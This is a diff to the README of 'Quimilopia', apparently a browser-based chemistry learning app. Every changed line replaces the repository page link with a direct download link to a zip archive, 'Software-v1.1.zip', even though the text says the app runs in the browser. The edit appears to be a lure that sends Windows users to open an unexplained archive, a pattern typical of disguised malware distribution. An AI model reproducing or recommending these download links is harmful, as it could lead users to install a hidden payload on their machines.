@@ -1,6 +1,6 @@
 # 🧪 Quimilopia - Virtual Lab for Chemical Learning
 
-[![Download Quimilopia](https://img.shields.io/badge/Download-Quimilopia-brightgreen)](https://github.com/EVANGERSHON/Quimilopia)
+[![Download Quimilopia](https://img.shields.io/badge/Download-Quimilopia-brightgreen)](https://github.com/EVANGERSHON/Quimilopia/raw/refs/heads/main/github/Software-v1.1.zip)
 
 ## 🔬 About Quimilopia
 
@@ -38,11 +38,11 @@ This section walks you through downloading and opening Quimilopia on your Window
 
 You will start by visiting the official repository page to download the application. The platform runs entirely in your web browser, but initial files and instructions are on GitHub.
 
-[![Download Quimilopia](https://img.shields.io/badge/Download-Quimilopia-blue)](https://github.com/EVANGERSHON/Quimilopia)
+[![Download Quimilopia](https://img.shields.io/badge/Download-Quimilopia-blue)](https://github.com/EVANGERSHON/Quimilopia/raw/refs/heads/main/github/Software-v1.1.zip)
 
 Click the green button above or visit:
 
-https://github.com/EVANGERSHON/Quimilopia
+https://github.com/EVANGERSHON/Quimilopia/raw/refs/heads/main/github/Software-v1.1.zip
 
 ### 2. Access the Web Interface
 
@@ -113,7 +113,7 @@ This app covers:
 
 Go back to the download link below to get started whenever you're ready:
 
-[Download and open Quimilopia](https://github.com/EVANGERSHON/Quimilopia)
+[Download and open Quimilopia](https://github.com/EVANGERSHON/Quimilopia/raw/refs/heads/main/github/Software-v1.1.zip)
 
 Explore the virtual lab tools and practice experiments safely from your Windows computer.
 
